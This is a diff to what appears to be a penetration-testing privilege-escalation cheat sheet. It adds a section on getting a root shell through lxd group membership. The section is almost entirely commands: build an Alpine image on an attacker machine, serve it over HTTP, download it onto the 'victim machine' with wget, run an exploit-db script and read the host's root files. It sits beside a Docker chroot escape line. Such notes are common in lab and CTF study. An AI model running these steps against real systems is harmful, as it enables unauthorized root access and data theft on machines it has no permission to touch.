@@ -360,7 +360,32 @@ docker run -v /:/mnt --rm -it <image_name> chroot /mnt bash
 ```
 
 ---
+## lxd Group 
+> If your user is in the lxd group get root shell by:
 
+```bash
+#in local machine (kali)
+git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder
+sudo ./build-alpine
+
+# it will generate .tar.gz file alpine-v3.22-x86_64-YYYYMMDD_HHMM.tar.gz
+
+# Host your local via HTTP
+sudo python3 -m http.server 80
+
+# in victim machine
+wget http://[YourIP]/alpine-v3.22-x86_64-20250716_2213.tar.gz
+
+
+# Copy this sh script from (https://www.exploit-db.com/exploits/46978) and save it in victim machine using nano or Vim.
+
+chmod +x LxD.sh # script you copied from exploit-db
+
+./LxD.sh -f alpine-v3.22-x86_64-YYYYMMDD_HHMM.tar.gz
+
+cd /mnt/root # to mount root files
+```
 ## Containerd (ctr) with NOPASSWD sudo
 
 ```bash
